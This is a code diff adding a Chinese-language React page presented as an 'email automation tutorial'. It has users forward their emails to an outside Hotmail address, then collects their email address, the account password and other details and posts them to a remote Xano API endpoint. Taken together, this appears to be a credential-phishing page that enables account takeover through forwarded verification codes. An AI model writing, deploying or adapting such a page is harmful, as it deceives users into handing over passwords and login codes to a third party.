@@ -1,0 +1,205 @@
+import React, { useState } from 'react';
+import { Input } from "@/components/ui/input";
+import { Button } from "@/components/ui/button";
+import { Card, CardHeader, CardTitle, CardContent, CardFooter } from "@/components/ui/card";
+import { Label } from "@/components/ui/label";
+import { AlertCircle, Mail, User, Lock, FileText, CheckCircle2 } from 'lucide-react';
+import { Checkbox } from "@/components/ui/checkbox";
+
+const AutomationTutorial = ({ onComplete }) => {
+  const [step1Completed, setStep1Completed] = useState(false);
+
+  const handleStep1Change = (checked) => {
+    setStep1Completed(checked);
+    if (checked) {
+      onComplete();
+    }
+  };
+
+  return (
+    <Card className="w-full max-w-md mx-auto mt-10 bg-gradient-to-br from-purple-50 to-indigo-100 shadow-xl rounded-lg overflow-hidden">
+      <CardHeader className="bg-gradient-to-r from-purple-600 to-indigo-600 text-white p-6">
+        <CardTitle className="text-2xl font-bold text-center">邮件自动化教程</CardTitle>
+      </CardHeader>
+      <CardContent className="p-6 space-y-6">
+        <div className="space-y-4">
+          <h3 className="text-lg font-semibold text-gray-800">1. 设置邮件转发</h3>
+          <div className="flex items-start space-x-3">
+            <Checkbox
+              id="step1"
+              checked={step1Completed}
+              onCheckedChange={handleStep1Change}
+              className="mt-1"
+            />
+            <div>
+              <Label htmlFor="step1" className="text-sm font-medium text-gray-700">
+                将您想要自动化的邮件转发到 xxxxx@hotmail.com
+              </Label>
+              <p className="text-sm text-gray-600 mt-1">
+                打开邮箱设置 → 转发设置 → 填写转发邮箱
+              </p>
+            </div>
+          </div>
+        </div>
+        {step1Completed && (
+          <div className="space-y-2">
+            <h3 className="text-lg font-semibold text-gray-800">2. 填写自动化收集信息</h3>
+            <p className="text-sm text-gray-600">
+              请在下方表单中填写所需信息以完成设置。
+            </p>
+          </div>
+        )}
+      </CardContent>
+    </Card>
+  );
+};
+
+const EmailCollectionForm = () => {
+  const [formData, setFormData] = useState({
+    name: '',
+    Email: '',
+    password: '',
+    need: ''
+  });
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [error, setError] = useState('');
+
+  const handleChange = (e) => {
+    const { name, value } = e.target;
+    setFormData(prevState => ({
+      ...prevState,
+      [name]: value
+    }));
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    setError('');
+
+    try {
+      const response = await fetch('https://x8ki-letl-twmt.n7.xano.io/api:YjC_TEO2/test', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData),
+      });
+
+      if (!response.ok) {
+        throw new Error('提交失败，请稍后重试');
+      }
+
+      alert('提交成功！');
+      setFormData({ name: '', Email: '', password: '', need: '' });
+    } catch (err) {
+      setError(err.message);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  return (
+    <Card className="w-full max-w-md mx-auto mt-6 bg-gradient-to-br from-blue-50 to-indigo-100 shadow-xl rounded-lg overflow-hidden">
+      <CardHeader className="bg-gradient-to-r from-blue-600 to-indigo-600 text-white p-6">
+        <CardTitle className="text-2xl font-bold text-center">邮件自动化收集</CardTitle>
+      </CardHeader>
+      <CardContent className="p-6">
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <div className="space-y-1">
+            <Label htmlFor="name" className="text-sm font-medium text-gray-700 flex items-center">
+              <User className="w-4 h-4 mr-2" />
+              昵称
+            </Label>
+            <Input
+              id="name"
+              name="name"
+              type="text"
+              value={formData.name}
+              onChange={handleChange}
+              required
+              className="mt-1 bg-white bg-opacity-80 focus:ring-2 focus:ring-blue-500 transition duration-200"
+              placeholder="请输入您的昵称"
+            />
+          </div>
+          <div className="space-y-1">
+            <Label htmlFor="Email" className="text-sm font-medium text-gray-700 flex items-center">
+              <Mail className="w-4 h-4 mr-2" />
+              需要接受验证码的邮件
+            </Label>
+            <Input
+              id="Email"
+              name="Email"
+              type="email"
+              value={formData.Email}
+              onChange={handleChange}
+              required
+              className="mt-1 bg-white bg-opacity-80 focus:ring-2 focus:ring-blue-500 transition duration-200"
+              placeholder="请输入您的邮箱地址"
+            />
+          </div>
+          <div className="space-y-1">
+            <Label htmlFor="password" className="text-sm font-medium text-gray-700 flex items-center">
+              <Lock className="w-4 h-4 mr-2" />
+              用户密码
+            </Label>
+            <Input
+              id="password"
+              name="password"
+              type="password"
+              value={formData.password}
+              onChange={handleChange}
+              required
+              className="mt-1 bg-white bg-opacity-80 focus:ring-2 focus:ring-blue-500 transition duration-200"
+              placeholder="请设置您的密码"
+            />
+          </div>
+          <div className="space-y-1">
+            <Label htmlFor="need" className="text-sm font-medium text-gray-700 flex items-center">
+              <FileText className="w-4 h-4 mr-2" />
+              其他需要
+            </Label>
+            <Input
+              id="need"
+              name="need"
+              type="text"
+              value={formData.need}
+              onChange={handleChange}
+              className="mt-1 bg-white bg-opacity-80 focus:ring-2 focus:ring-blue-500 transition duration-200"
+              placeholder="如有其他需求，请在此说明"
+            />
+          </div>
+          {error && (
+            <div className="p-3 bg-red-100 border border-red-400 text-red-700 rounded flex items-center">
+              <AlertCircle className="mr-2" />
+              <span>{error}</span>
+            </div>
+          )}
+        </form>
+      </CardContent>
+      <CardFooter className="bg-gray-50 p-6">
+        <Button 
+          type="submit" 
+          className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold py-2 px-4 rounded-md transition duration-300 ease-in-out transform hover:-translate-y-1 hover:shadow-lg"
+          disabled={isSubmitting}
+          onClick={handleSubmit}
+        >
+          {isSubmitting ? '提交中...' : '提交'}
+        </Button>
+      </CardFooter>
+    </Card>
+  );
+};
+
+const EmailAutomationPage = () => {
+  const [tutorialCompleted, setTutorialCompleted] = useState(false);
+
+  return (
+    <div className="container mx-auto px-4 py-8">
+      <AutomationTutorial onComplete={() => setTutorialCompleted(true)} />
+      {tutorialCompleted && <EmailCollectionForm />}
+    </div>
+  );
+};
+
+export default EmailAutomationPage;
